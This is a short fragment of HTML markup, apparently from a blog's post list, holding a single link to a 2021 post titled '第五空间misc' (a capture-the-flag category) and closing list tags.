-            <a href="/2021/09/22/page-117/">第五空间misc</a>
           </li>
         
       </ul>
